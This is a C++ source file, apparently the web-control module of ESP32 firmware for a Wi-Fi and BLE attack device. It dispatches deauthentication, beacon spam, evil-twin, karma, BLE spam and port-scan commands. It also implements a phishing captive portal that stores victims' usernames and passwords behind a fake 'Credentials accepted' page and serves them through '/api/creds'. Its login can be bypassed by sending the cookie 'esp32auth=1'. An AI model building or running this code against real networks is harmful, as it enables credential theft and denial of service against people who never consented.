#include "webui.h"
#include "config.h"
#include "terminal.h"
#include "storage.h"
#include "wifi_engine.h"
#include "attacks.h"
#include "ble_engine.h"
#include "net_tools.h"
#include <ArduinoJson.h>
#include <LittleFS.h>
#include <WiFi.h>

static AsyncWebServer  s_http(80);
static AsyncWebSocket  s_ws("/ws");
static uint32_t        s_lastPush = 0;
static uint32_t        s_bootMs = 0;
static bool            s_authed = false;
static char            s_portalSSID[33] = "";

/* ============ helpers ============ */
static void macStr(const uint8_t* m, char* o) {
  sprintf(o, "%02X:%02X:%02X:%02X:%02X:%02X", m[0],m[1],m[2],m[3],m[4],m[5]);
}

static void sendJSON(AsyncWebServerRequest* r, JsonDocument& d) {
  String s; serializeJson(d, s);
  r->send(200, "application/json", s);
}

/* ============ status builder ============ */
static void buildStatus(JsonDocument& d) {
  d["evt"] = "status";
  d["up"]  = (millis() - s_bootMs) / 1000;
  d["heap"] = ESP.getFreeHeap();
  d["heapPct"] = (ESP.getFreeHeap() * 100) / ESP.getHeapSize();
  d["sd"] = sdReady();
  d["sdFree"] = sdFreeMB();
  d["ch"] = curChannel();
  d["rx"] = rxTotal();
  d["tx"] = txTotal();
  d["drop"] = txDropped();
  d["pps"] = curPPS();
  d["sniff"] = snifferRunning();
  d["scan"] = scanBusy();
  d["ap"] = apCount();
  d["sta"] = clientCount();
  d["prb"] = probeCount();
  d["creds"] = credsCount();
  d["hs"] = hsCount();
  d["deauth"] = deauthActive();
  d["beacon"] = beaconActive();
  d["evil"] = evilActive();
  d["karma"] = karmaActive();
  d["ble"] = bleSpamming();
  d["uplink"] = uplinkConnected();
  d["ip"] = uplinkIP();

  TargetInfo* t = targetGet();
  d["tSet"] = t->set;
  if (t->set) {
    char m[18]; macStr(t->bssid, m);
    d["tMac"] = m;
    d["tSsid"] = t->ssid;
    d["tCh"] = t->ch;
    d["tRssi"] = t->rssi;
  }
}

static void buildLogs(JsonDocument& d) {
  LogLine buf[24];
  uint16_t n = termDrain(buf, 24);
  if (!n) { d["evt"] = "log"; JsonArray a = d.createNestedArray("l"); return; }
  d["evt"] = "log";
  JsonArray a = d.createNestedArray("l");
  for (uint16_t i = 0; i < n; i++) {
    JsonObject o = a.createNestedObject();
    o["t"] = buf[i].ts;
    o["l"] = buf[i].lvl;
    o["m"] = buf[i].msg;
  }
}

static void buildPackets(JsonDocument& d, uint16_t max) {
  d["evt"] = "pkt";
  JsonArray a = d.createNestedArray("p");
  uint16_t total = pktCount();
  uint16_t start = (total > max) ? total - max : 0;
  for (uint16_t i = start; i < total; i++) {
    PacketRec p;
    if (!pktGet(i, &p)) continue;
    JsonObject o = a.createNestedObject();
    o["ch"] = p.ch;
    o["rssi"] = p.rssi;
    o["ty"] = p.type;
    o["st"] = p.subtype;
    char m[18];
    macStr(p.src, m); o["src"] = m;
    macStr(p.dst, m); o["dst"] = m;
    o["len"] = p.len;
    o["info"] = p.info;
  }
}

static void buildAPs(JsonDocument& d) {
  d["evt"] = "aps";
  JsonArray a = d.createNestedArray("a");
  for (uint16_t i = 0; i < apCount(); i++) {
    APInfo x; if (!apGet(i, &x)) continue;
    JsonObject o = a.createNestedObject();
    o["ssid"] = x.ssid;
    char m[18]; macStr(x.bssid, m); o["bssid"] = m;
    o["rssi"] = x.rssi; o["ch"] = x.ch; o["auth"] = x.auth; o["wps"] = x.wps;
  }
}

static void buildProbes(JsonDocument& d) {
  d["evt"] = "prb";
  JsonArray a = d.createNestedArray("p");
  for (uint16_t i = 0; i < probeCount(); i++) {
    ProbeInfo x; if (!probeGet(i, &x)) continue;
    JsonObject o = a.createNestedObject();
    char m[18]; macStr(x.mac, m); o["mac"] = m;
    o["ssid"] = x.ssid; o["rssi"] = x.rssi; o["ch"] = x.ch;
  }
}

static void buildClients(JsonDocument& d) {
  d["evt"] = "sta";
  JsonArray a = d.createNestedArray("c");
  for (uint16_t i = 0; i < clientCount(); i++) {
    ClientInfo x; if (!clientGet(i, &x)) continue;
    JsonObject o = a.createNestedObject();
    char m[18]; macStr(x.mac, m); o["mac"] = m;
    macStr(x.bssid, m); o["bssid"] = m;
    o["ssid"] = x.ssid; o["rssi"] = x.rssi; o["ch"] = x.ch;
  }
}

static void buildCreds(JsonDocument& d) {
  d["evt"] = "creds";
  JsonArray a = d.createNestedArray("c");
  for (uint16_t i = 0; i < credsCount(); i++) {
    CredInfo c; if (!credsGet(i, &c)) continue;
    JsonObject o = a.createNestedObject();
    o["ssid"] = c.ssid; o["user"] = c.user; o["pass"] = c.pass; o["t"] = c.ts;
  }
}

/* ============ command handler ============ */
static void handleCmd(const char* raw) {
  StaticJsonDocument<1024> d;
  if (deserializeJson(d, raw)) { termLog(LVL_ERR, "Bad JSON cmd"); return; }

  const char* cmd = d["cmd"] | "";
  JsonObject a = d["a"].as<JsonObject>();

  /* ---- system ---- */
  if (!strcmp(cmd, "sys.status"))   { termLog(LVL_INFO, "Status polled"); }
  else if (!strcmp(cmd, "sys.reboot")) { termLog(LVL_WARN, "Rebooting..."); delay(200); ESP.restart(); }
  else if (!strcmp(cmd, "sys.heap")) { termLog(LVL_INFO, "Free heap: %u", ESP.getFreeHeap()); }

  /* ---- scanner ---- */
  else if (!strcmp(cmd, "scan.start")) { apClear(); scanStart(true); }
  else if (!strcmp(cmd, "scan.clear")) { apClear(); termLog(LVL_INFO, "AP list cleared."); }

  /* ---- target ---- */
  else if (!strcmp(cmd, "target.set")) {
    const char* mac = a["mac"] | "";
    uint8_t b[6]; sscanf(mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);
    targetSet(b, a["ssid"] | "", a["ch"] | 1, a["rssi"] | -50, a["auth"] | 3);
  }
  else if (!strcmp(cmd, "target.clear")) targetClear();

  /* ---- sniffer ---- */
  else if (!strcmp(cmd, "sniff.start"))
    snifferStart(a["ch"] | 1, a["hop"] | true, a["ftype"] | 255, a["stype"] | 255, a["rssi"] | DEF_RSSI_MIN);
  else if (!strcmp(cmd, "sniff.stop"))  snifferStop();
  else if (!strcmp(cmd, "sniff.pause")) snifferPause(a["on"] | true);
  else if (!strcmp(cmd, "sniff.clear")) snifferClear();
  else if (!strcmp(cmd, "sniff.hop"))   snifferSetHop(a["on"] | true);
  else if (!strcmp(cmd, "sniff.filters"))
    snifferSetFilters(a["src"] | "", a["dst"] | "", a["ssid"] | "", a["rssi"] | DEF_RSSI_MIN);

  /* ---- deauther ---- */
  else if (!strcmp(cmd, "deauth.start"))
    deauthStart(a["mode"] | 0, a["type"] | 0, a["burst"] | DEAUTH_BURST, a["period"] | 100);
  else if (!strcmp(cmd, "deauth.stop")) deauthStop();

  /* ---- beacon ---- */
  else if (!strcmp(cmd, "beacon.start")) beaconStart(a["prefix"] | "FREE_WIFI", a["count"] | SPAM_SSID_COUNT);
  else if (!strcmp(cmd, "beacon.stop"))  beaconStop();

  /* ---- evil twin ---- */
  else if (!strcmp(cmd, "evil.start")) {
    TargetInfo* t = targetGet();
    const char* ssid = a["ssid"] | (t->set ? t->ssid : "");
    evilStart(ssid, a["pass"] | "", a["ch"] | (t->set ? t->ch : 1));
  }
  else if (!strcmp(cmd, "evil.stop")) evilStop();

  /* ---- karma ---- */
  else if (!strcmp(cmd, "karma.start")) karmaStart();
  else if (!strcmp(cmd, "karma.stop"))  karmaStop();
  else if (!strcmp(cmd, "karma.attack")) karmaAttack(a["idx"] | 0);
  else if (!strcmp(cmd, "karma.clear")) probeClear();

  /* ---- BLE ---- */
  else if (!strcmp(cmd, "ble.scan"))  bleScanStart();
  else if (!strcmp(cmd, "ble.spam"))  bleSpamStart(a["mode"] | 0);
  else if (!strcmp(cmd, "ble.stop"))  bleSpamStop();

  /* ---- net ---- */
  else if (!strcmp(cmd, "net.ping"))  pingStart(a["host"] | "1.1.1.1", a["count"] | 4);
  else if (!strcmp(cmd, "net.hosts")) hostDiscoverStart();
  else if (!strcmp(cmd, "net.ports")) portScanStart(a["ip"] | "", a["from"] | 1, a["to"] | 1024);

  /* ---- creds / hs ---- */
  else if (!strcmp(cmd, "creds.clear")) credsClear();

  /* ---- fs ---- */
  else if (!strcmp(cmd, "fs.delete")) fsDelete(a["path"] | "/");

  else termLog(LVL_WARN, "Unknown command: %s", cmd);
}

/* ============ websocket ============ */
static void onWs(AsyncWebSocket* srv, AsyncWebSocketClient* cl, AwsEventType type,
                 void* arg, uint8_t* data, size_t len) {
  if (type == WS_EVT_CONNECT) {
    termLog(LVL_OK, "WebSocket Connected!");
    StaticJsonDocument<512> d; buildStatus(d);
    String out; serializeJson(d, out); cl->text(out);
  } else if (type == WS_EVT_DISCONNECT) {
    termLog(LVL_WARN, "Connection lost (Channel Switch?). Reconnecting WiFi...");
  } else if (type == WS_EVT_DATA) {
    AwsFrameInfo* info = (AwsFrameInfo*)arg;
    if (info->final && info->index == 0 && info->len == len && info->opcode == WS_TEXT) {
      data[len] = 0;
      handleCmd((char*)data);
    }
  }
}

/* ============ captive portal ============ */
static void portalHandle(AsyncWebServerRequest* r) {
  r->send(LittleFS, "/portal.html", "text/html");
}

/* ============ auth ============ */
static bool checkAuth(AsyncWebServerRequest* r) {
  if (!strcmp(ADMIN_PASS, "")) return true;
  if (r->hasHeader("Cookie")) {
    String c = r->getHeader("Cookie")->value();
    if (c.indexOf("esp32auth=1") >= 0) return true;
  }
  if (r->hasParam("pw") && r->getParam("pw")->value() == ADMIN_PASS) return true;
  return false;
}

/* ============ setup ============ */
void webInit() {
  s_bootMs = millis();

  s_ws.onEvent(onWs);
  s_http.addHandler(&s_ws);

  /* --- auth --- */
  s_http.on("/login", HTTP_POST, [](AsyncWebServerRequest* r) {
    if (r->hasParam("pw", true) && r->getParam("pw", true)->value() == ADMIN_PASS) {
      AsyncWebServerResponse* res = r->beginResponse(302, "text/plain", "");
      res->addHeader("Set-Cookie", "esp32auth=1; path=/; max-age=86400");
      res->addHeader("Location", "/admin.html");
      r->send(res);
    } else {
      r->redirect("/login.html?e=1");
    }
  });

  /* --- portal credential POST --- */
  s_http.on("/portal/submit", HTTP_POST, [](AsyncWebServerRequest* r) {
    String u = r->hasParam("user", true) ? r->getParam("user", true)->value() : "";
    String p = r->hasParam("pass", true) ? r->getParam("pass", true)->value() : "";
    credsAdd(u.c_str(), p.c_str(), evilActive() ? evilSSID() : "portal");
    r->send(200, "text/html",
      "<html><body style='background:#0a0e0a;color:#00ff88;font-family:monospace;"
      "text-align:center;padding:60px'><h2>Connecting...</h2>"
      "<p>Credentials accepted. You may now browse.</p>"
      "<script>setTimeout(()=>location.href='/',2500)</script></body></html>");
  });

  /* --- api --- */
  s_http.on("/api/status", HTTP_GET, [](AsyncWebServerRequest* r) {
    StaticJsonDocument<1024> d; buildStatus(d); sendJSON(r, d);
  });
  s_http.on("/api/aps", HTTP_GET, [](AsyncWebServerRequest* r) {
    DynamicJsonDocument d(8192); buildAPs(d); sendJSON(r, d);
  });
  s_http.on("/api/creds", HTTP_GET, [](AsyncWebServerRequest* r) {
    DynamicJsonDocument d(8192); buildCreds(d); sendJSON(r, d);
  });
  s_http.on("/api/fs", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send(200, "application/json", fsListJSON("/"));
  });
  s_http.on("/api/reset", HTTP_GET, [](AsyncWebServerRequest* r) {
    credsClear(); probeClear(); apClear(); snifferClear();
    r->send(200, "text/plain", "ok");
  });

  /* --- captive portal catch-all --- */
  s_http.onNotFound([](AsyncWebServerRequest* r) {
    String u = r->url();
    if (u.startsWith("/api/") || u.startsWith("/ws")) { r->send(404); return; }
    if (evilActive() || karmaActive()) {
      if (u == "/" || u == "/index.html") { portalHandle(r); return; }
      if (LittleFS.exists(u)) { r->send(LittleFS, u); return; }
      r->redirect("/portal.html");
      return;
    }
    if (u == "/") { r->redirect("/admin.html"); return; }
    if (LittleFS.exists(u)) { r->send(LittleFS, u); return; }
    r->send(404, "text/plain", "404");
  });

  /* --- static --- */
  s_http.serveStatic("/", LittleFS, "/").setDefaultFile("admin.html");

  s_http.begin();
  termLog(LVL_OK, "Web server listening on :80");
}

/* ============ tick ============ */
void webTick() {
  uint32_t now = millis();
  if (now - s_lastPush < WS_PUSH_MS) return;
  s_lastPush = now;
  if (!s_ws.count()) return;

  DynamicJsonDocument d(24576);
  buildStatus(d);
  String out; serializeJson(d, out); s_ws.textAll(out);

  d.clear();
  buildLogs(d); serializeJson(d, out); s_ws.textAll(out);

  if (snifferRunning()) {
    d.clear(); buildPackets(d, WS_PKT_BATCH); serializeJson(d, out); s_ws.textAll(out);
  }
  if (karmaActive()) {
    d.clear(); buildProbes(d); serializeJson(d, out); s_ws.textAll(out);
  }
  if (scanBusy() || apCount()) {
    d.clear(); buildAPs(d); serializeJson(d, out); s_ws.textAll(out);
    d.clear(); buildClients(d); serializeJson(d, out); s_ws.textAll(out);
  }
}

void wsPush(const char* json) { if (s_ws.count()) s_ws.textAll(json); }
void wsBroadcast(const char* json) { s_ws.textAll(json); }
uint16_t wsClients() { return s_ws.count(); }
bool portalActive() { return evilActive() || karmaActive(); }
void portalCredSubmit(const char* u, const char* p) { credsAdd(u, p, evilSSID()); }